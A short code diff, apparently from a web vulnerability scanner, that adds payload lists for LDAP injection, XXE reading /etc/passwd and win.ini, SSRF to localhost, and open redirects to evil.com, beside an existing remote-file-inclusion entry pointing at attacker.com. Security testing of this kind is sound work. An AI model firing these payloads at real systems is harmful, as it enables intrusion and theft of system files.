@@ -50,3 +50,24 @@ RFI_PAYLOADS = [
     "http://attacker.com/malicious.txt",
 ]
 
+LDAP_PAYLOADS = [
+    "*)(uid=*))(|(uid=*",
+    "*)(|(cn=*))",
+    "*)(&(objectClass=*))",
+    "*(|(objectClass=*))",
+]
+
+XXE_PAYLOADS = [
+    '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>',
+    '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]><foo>&xxe;</foo>',
+]
+
+SSRF_PAYLOADS = [
+    "http://127.0.0.1:80",
+    "http://localhost:80",
+]
+
+REDIRECT_PAYLOADS = [
+    "http://evil.com",
+    "http://phishing.com",
+]
